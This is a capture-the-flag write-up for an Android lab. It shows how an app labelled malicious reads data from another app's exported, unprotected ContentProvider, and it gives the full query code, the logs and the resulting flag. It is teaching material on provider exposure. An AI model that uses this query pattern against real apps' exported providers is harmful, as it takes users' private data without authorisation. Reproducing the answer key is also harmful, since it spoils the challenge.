# jokeprovider
This task will let you play with Content Providers.

The target app exposes a Content Provider. Find all jokes authored by "elosiouk" and concatenate them. That's the flag.

Some partial info on the target app:

```xml
======================================================================
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="[http://schemas.android.com/apk/res/android](http://schemas.android.com/apk/res/android)"
    package="com.example.victimapp">
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.VictimApp">
        ....
        <provider
            android:name=".MyProvider"
            android:authorities="com.example.victimapp.MyProvider"
            android:enabled="true"
            android:exported="true">
        </provider>
    </application>
</manifest>
```
```sql
======================================================================
String CREATE_TABLE =
                    " CREATE TABLE joke" +
                            " (id INTEGER PRIMARY KEY AUTOINCREMENT, " +
                            " author TEXT NOT NULL, " +
                            " joke TEXT NOT NULL);";

```
```java
======================================================================
static final String PROVIDER_NAME = "com.example.victimapp.MyProvider";
static final String TABLE_NAME = "joke";
static final String URL = "content://" + PROVIDER_NAME + "/" + TABLE_NAME;
static final int uriCode = 1;

static final UriMatcher uriMatcher;
    static{
        uriMatcher = new UriMatcher(UriMatcher.NO_MATCH);
        uriMatcher.addURI(PROVIDER_NAME, TABLE_NAME, uriCode);
    }
```


## How to solve it 

**Core Concept:** We need to act as a **Database Client**.
A `ContentProvider` acts as an interface to a database (often SQLite). We can query it using `getContentResolver().query()`, which functions similarly to writing a SQL statement.



**Our Goal:**
1.  **URI (Table):** `content://com.example.victimapp.MyProvider/joke`
2.  **Selection (WHERE):** `author = 'elosiouk'`
3.  **Projection (SELECT):** We only need the `joke` column.

Reference: [Content Provider Basics](https://developer.android.com/guide/topics/providers/content-provider-basics)

### 1. Android Manifest 
To interact with another app's content provider (especially on Android 11+), we must explicitly declare that we want to query that package.

```xml
<manifest ...>
    <queries>
        <package android:name="com.example.victimapp" />
    </queries>
    
    <application ...>
        ...
    </application>
</manifest>
```

### 2. The Query Logic (MainActivity)

We perform the query inside `onCreate`. We construct the query parts and iterate through the resulting `Cursor`.

```java
private static final String TAG = "CTF";

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    // 1. Define the URI (The table we want to query)
    Uri contentUri = Uri.parse("content://com.example.victimapp.MyProvider/joke");

    // 2. Projection (The columns we want to retrieve)
    String[] mProjection = { "joke" };

    // 3. Selection Clause (The WHERE condition)
    String selectionClause = "author = ?";

    // 4. Selection Arguments (Replacing the '?' in the clause)
    String[] selectionArgs = { "elosiouk" };

    // 5. Execute the Query
    Cursor mCursor = getContentResolver().query(
            contentUri,         // The content URI
            mProjection,        // The columns to return
            selectionClause,    // The WHERE clause
            selectionArgs,      // The values for the WHERE clause
            null                // Sort order (we don't care)
    );

    // 6. Process the Results
    if (mCursor != null) {
        Log.d(TAG, "Found " + mCursor.getCount() + " jokes");
        
        while (mCursor.moveToNext()) {
            // Get the index of the column we requested
            int index = mCursor.getColumnIndex("joke");

            // Read the string data
            if(index >= 0) {
                String jokeText = mCursor.getString(index);
                Log.d(TAG, "Found Joke: " + jokeText);
            }
        }

        // Always close the cursor to avoid memory leaks
        mCursor.close();
    } else {
        Log.d(TAG, "Cursor is null, query failed");
    }
}
```

## Solution 

The logs will print the flag parts sequentially.

```bash
2026-01-20 15:11:58.647 11515-11515 CTF    com.example.maliciousapp   D  onCreate
2026-01-20 15:11:58.693 11515-11515 CTF    com.example.maliciousapp   D  Found 4 jokes
2026-01-20 15:11:58.693 11515-11515 CTF    com.example.maliciousapp   D  Found Joke: FLAG{Homo
2026-01-20 15:11:58.694 11515-11515 CTF    com.example.maliciousapp   D  Found Joke: _faber_
2026-01-20 15:11:58.694 11515-11515 CTF    com.example.maliciousapp   D  Found Joke: fortunae_
2026-01-20 15:11:58.694 11515-11515 CTF    com.example.maliciousapp   D  Found Joke: suae}
```

**Constructed Flag:** `FLAG{Homo_faber_fortunae_suae}`